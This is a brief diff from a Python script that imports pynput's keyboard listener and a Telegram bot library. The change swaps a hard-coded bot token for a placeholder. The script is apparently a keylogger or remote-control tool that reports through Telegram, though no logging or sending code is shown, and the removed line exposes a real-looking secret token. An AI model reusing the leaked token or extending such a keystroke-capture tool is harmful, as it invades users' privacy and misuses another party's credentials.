@@ -21,7 +21,7 @@ import shutil
 from pynput import keyboard
 from datetime import datetime, timedelta
 try:
-    bot = telebot.TeleBot('6451048923:AAHbUCjxsAhVSzhtV89U_Wl5Pm2V-YkAfLk')
+    bot = telebot.TeleBot('YOUR_API_TOKEN')
 except Exception as e:
     pass
 #################################################################################
